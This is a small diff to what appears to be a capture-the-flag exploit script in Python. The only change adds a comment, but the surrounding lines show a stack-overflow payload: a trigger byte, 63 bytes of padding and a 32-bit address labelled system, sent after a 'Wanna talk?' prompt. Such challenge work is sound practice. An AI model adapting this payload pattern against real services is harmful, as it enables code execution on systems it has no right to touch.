@@ -20,7 +20,7 @@ def solve():
     # break *0x08048758
     # ''')
 
-    payload = b'y'
+    payload = b'y' # Needed to trigger if check
     payload += b'a' * 63
     payload += p32(0x08048898) # system
     p.sendlineafter("Wanna talk?", payload)
